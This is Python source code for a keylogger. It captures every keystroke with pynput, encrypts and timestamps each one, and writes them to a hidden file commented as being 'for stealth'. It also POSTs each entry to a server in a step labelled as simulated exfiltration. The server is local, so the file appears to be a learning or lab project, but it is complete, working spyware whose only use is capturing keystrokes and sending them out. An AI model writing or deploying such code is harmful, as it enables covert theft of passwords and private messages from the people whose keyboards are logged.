# Captures keystrokes, encrypts with Fernet, logs with timestamps

from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import base64
import os
import sys
import requests

# Step 1: Load encryption key from file
key_path = "key.key"
if not os.path.exists(key_path):
    print("❌ Encryption key not found. Please run keygen.py first.")
    sys.exit(1)

with open(key_path, "rb") as key_file:
    key = key_file.read()

# Initialize Fernet with loaded key
fernet = Fernet(key)

# Step 2: Define output file for local logs (hidden for stealth)
log_file = ".keylog.txt"

# Step 3: Encrypt and log each keystroke
def write_encrypted_log(data):
    """
    Encrypts a single keystroke with a timestamp.
    Logs to a local file and sends encrypted data to the server.
    """
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {data}\n"

    encrypted = fernet.encrypt(log_entry.encode())
    encoded = base64.b64encode(encrypted)

    # Save encrypted+base64 locally
    with open(log_file, "ab") as file:
        file.write(encoded + b"\n")

    # Simulate exfiltration: POST to remote Flask server
    try:
        response = requests.post("http://127.0.0.1:5000/receive-log", data=encrypted)
        if response.status_code == 200:
            print("📤 Log sent to server successfully.")
        else:
            print(f"⚠️ Server responded with: {response.status_code}")
    except Exception as e:
        print(f"❌ Failed to send to server: {e}")

# Step 4: Key press handler (runs on each key event)
def on_press(key):
    """
    Handles a single key press event.
    Logs the character or special key (e.g., space, enter).
    """
    if key == keyboard.Key.esc:
        print("🛑 Keylogger stopped.")
        return False  # Stops the listener

    try:
        # Alphanumeric key
        write_encrypted_log(key.char)
    except AttributeError:
        # Special key (e.g., space, enter, ctrl)
        write_encrypted_log(f"[{key.name}]")

# Step 5: Start keyboard listener
print("🟢 Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
